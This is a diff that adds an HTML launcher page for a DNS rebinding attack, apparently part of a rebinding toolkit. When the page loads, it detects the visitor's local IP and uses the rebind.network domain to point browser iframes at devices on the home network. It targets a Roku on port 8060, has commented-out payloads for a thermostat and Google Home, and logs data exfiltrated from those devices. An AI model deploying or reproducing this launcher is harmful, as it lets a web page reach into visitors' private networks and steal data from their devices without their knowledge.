@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<head>
+	<title>Example launcher</title>
+</head>
+<body>
+    <p>Open your developer's console to see what's happening.</p>
+    <!-- This EventEmitter class must be included -->
+    <script type="text/javascript" src="/share/js/EventEmitter.js"></script>
+    <script type="text/javascript" src="/share/js/DNSRebindAttack.js"></script>
+    <script type="text/javascript">
+
+    DNSRebindAttack.getLocalIPAddress()
+    .then(ip => launch(ip))
+    .catch(err => {
+        console.error(err)
+        launch('192.168.1.1')
+    })
+    
+    function launch(localIp) {
+        // launchRebindAttack(localIp, 80, 'payloads/radio-thermostat.html')
+        // launchRebindAttack(localIp, 8008, 'payloads/google-home.html')
+        launchRebindAttack(localIp, 8060, 'payloads/roku-info.html')
+    }
+
+    function launchRebindAttack(localIp, remotePort, payload) {
+
+        // convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255
+        const first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))
+        // const ips = [...Array(256).keys()].map(octet => `${first3Octets}.${octet}`)
+        
+        const ips = ['192.168.7.69']
+
+        const rebind = new DNSRebindAttack('rebind.network', remotePort)
+        rebind.attack(ips, '127.0.0.1', payload, 200)
+
+        rebind.on('iframe-added', (ip, src) => {
+            
+        })
+
+        rebind.on('all-iframes-added', () => {
+
+        })
+
+        rebind.on('iframe-removed', (ip, src) => {
+        	// console.log(payload, 'iframe-removed', ip, src)
+        })
+        
+
+        rebind.nodes.on('rebind', (ip) => {
+            console.log(payload, 'node rebind', ip)
+        })
+        
+        rebind.nodes.on('exfiltrate', (ip, data) => {
+            console.log(payload, 'node exfiltrate', ip, data)
+        })
+
+        rebind.nodes.on('fatal', (ip, data) => {
+            // console.error(payload, 'node fatal', ip, data)
+        })
+
+    }
+
+    </script>
+</body>
+</html>
